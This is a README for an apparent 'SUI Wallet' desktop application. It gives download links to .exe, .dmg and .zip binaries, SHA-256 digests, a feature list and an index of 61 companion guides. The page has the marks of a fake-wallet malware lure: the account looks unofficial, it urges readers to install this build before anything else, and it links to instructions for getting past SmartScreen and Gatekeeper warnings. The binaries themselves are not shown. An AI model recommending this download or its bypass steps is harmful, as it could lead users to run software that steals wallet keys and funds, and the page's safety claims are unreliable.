![SUI Wallet](assets/banner-app.png)

# SUI Wallet for desktop

Windows, macOS and Linux from one release: self-custody keys, native staking, Ledger and zkLogin.

[![License: Apache-2.0](https://img.shields.io/badge/LICENSE-Apache--2.0-4DA2FF?style=for-the-badge&labelColor=0D1117)](#license) [![Latest release: v0.2.6](https://img.shields.io/badge/RELEASE-v0.2.6-1F6FEB?style=for-the-badge&labelColor=0D1117)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/tag/v0.2.6)

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

SUI Wallet is a native desktop wallet for the Sui blockchain. Download the file for your operating system from the release above, check it against the published SHA-256 digest, and run it. The wallet generates its own 24-word recovery phrase on first launch and stores keys on your machine.

## What this repository is for

This is the application repository. It holds the release that every guide in this account points at, and it is the only place the desktop builds are published. A release ships three files together - one Windows installer, one macOS disk image and one Linux archive - so the choice a reader makes is about their machine, never about a feature tier or a newer build.

Because the wallet is self-custody, the application holds something no server holds: the key material for an account. That shapes what this repository is *not*. It is not a dashboard for an account held elsewhere, and there is no password reset, no support channel that can move funds and no mechanism by which this project can restore a phrase for you. What the application can do is make the local practice safer: derive the phrase on the device, show a transaction's effect before it is signed, keep keys behind a hardware device when one is paired, and keep every transfer inside a preview screen the user has to read.

## Who it is for

- Desktop users on 64-bit Windows 10 or later, macOS 12 or later, or x64 Linux, who want Sui keys on their own machine rather than in a browser extension.
- People who hold Sui and want staking, hardware-key signing and NFT management in one application.
- Readers following the 61 guides in this account, who need the release each of them refers to.

## Start here

1. [SUI Wallet desktop download: which build to take](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/sui-wallet-desktop-download.md) - pick the file that matches your machine, in one page.
2. [SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) - the first run, and the phrase that is the account.
3. [Pairing Ledger with SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/pairing-ledger-with-sui-wallet.md) - keeping the key on a device instead of the disk.
4. [Staking SUI in the wallet app](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/staking-sui-in-the-wallet-app.md) - what delegation looks like from inside the app.

### SHA-256 for the three files

| File | SHA-256 |
| --- | --- |
| `sui-wallet-desktop-win-v0.2.6.exe` | `929ed384b4946a791500da702b656885a7e05b68aa94b8bf85cf9f21443200c1` |
| `sui-wallet-desktop-macos-v0.2.6.dmg` | `dda50fe7f43a9eaecb37a99662b938fa06b8e1ad0ed82cee9a59f0cedf555f75` |
| `sui-wallet-desktop-linux-v0.2.6.zip` | `4fd9ef8451e33c1716513cc5569fe3b43d7ec1b7163986faa458351613fa52ab` |

## How to use these guides

1. Install the current release before reading a troubleshooting page. Every problem readers have reported is addressed in the build above, so an older build is the first variable to remove.
2. Keep the release page open while you install: it carries the digests you are comparing against.
3. Do the phrase step before funding anything. A wallet with a balance and no backup is the one situation no guide can repair.
4. Follow the repository that owns your question rather than the whole account. The three are split by intent, so the first page you open is usually the one you need.

## The guides grouped

| Repository | Guides | Start with |
| --- | --- | --- |
| [install and repair guides](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting) | 14 | [Which SUI Wallet file do I download?](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/which-sui-wallet-file-do-i-download.md) |
| [keys and login guides](https://github.com/sui-blockchain-wallet/key-safety-and-login) | 16 | [Is SUI Wallet safe to use?](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/is-sui-wallet-safe-to-use.md) |
| [transfers and staking guides](https://github.com/sui-blockchain-wallet/onchain-transfer-guides) | 31 | [Finding your SUI Wallet address](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/finding-your-sui-wallet-address.md) |

## What each guide changes

| Task | Guide | Outcome |
| --- | --- | --- |
| Confirm a download is genuine | [verify you have the official SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/how-to-verify-the-official-sui-wallet.md) | A file that matches its published digest, taken from the release page. |
| Run the app for the first time | [Creating a new SUI Wallet](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/creating-a-new-sui-wallet.md) | An account whose phrase is written down and whose address is recorded. |
| Update an older build | [Updating SUI Wallet to the latest release](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/updating-sui-wallet-to-the-latest-release.md) | The current release running, with the old build's problems gone. |
| Read what a transaction will do | [Approving transactions in SUI Wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/approving-transactions-in-sui-wallet.md) | A signature given after the effect was read, not before. |
| Remove the app completely | [How to uninstall SUI Wallet completely](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-uninstall-sui-wallet-completely.md) | No application and no local account data left on the machine. |

## Features this build carries

- Self-custody keys, generated and stored on your machine; the operator cannot move or freeze funds.
- Native SUI staking with a validator list showing APY, commission, voting power and uptime.
- Liquid staking through Haedal, which returns a token while the underlying stake stays delegated.
- Ledger support through the official Sui device app, on Nano S Plus, Nano X, Stax and Flex.
- zkLogin sign-in with Google, Apple or Facebook, where the provider does not learn the Sui address.
- DeepBook trading against an on-chain central-limit order book, with market and limit orders.
- NFT display, send and burn for Sui-standard objects, plus SuiNS name support.
- Multiple accounts inside one recovery phrase, and a transaction preview before every signature.
- A 24-word BIP39 phrase generated on the device, and no telemetry enabled by default.

## Common first questions

### Do I need an account or a licence to use it?

No. The release is public and the wallet asks for no registration, payment or key. The phrase it generates on first run is the only credential involved.

### Is there a mobile build?

No. The product is desktop-only, and the three files above are the whole distribution. A page advertising a mobile app under this name is not from this project.

### Why does the operating system warn about the file?

Windows SmartScreen flags an unrecognised publisher and macOS Gatekeeper flags an unidentified developer, on files that are otherwise correct. [installing SUI Wallet past SmartScreen](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/windows-protected-your-pc-sui-wallet.md) and its macOS counterpart explain the prompt and the way past it.

## Before you install

Windows needs build 1909 or later on 64-bit hardware, macOS needs 12 or later, and Linux needs x64 with Ubuntu 20.04 or an equivalent distribution. Anything else is outside the published scope, and the failure looks like an app that will not start rather than an error message about the platform.

The SHA-256 table above is the second half of the check. Compare it against the digest the release page prints beside each asset, and treat a mismatch as a file you should delete rather than run.

## About

The guides that accompany this build are split across three repositories in the same account: [install and repair](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting), [keys and login](https://github.com/sui-blockchain-wallet/key-safety-and-login) and [transfers and staking](https://github.com/sui-blockchain-wallet/onchain-transfer-guides). The index for all of them is [the profile repository](https://github.com/sui-blockchain-wallet).

## License

Apache License 2.0. The licence file sits at the root of this repository, and a documentation licence sits beside it for the guides tree.

---

SUI Wallet is a self-custody desktop wallet for Sui. Every feature listed above ships in this repository's release; nothing in this page is a promise about a later version.
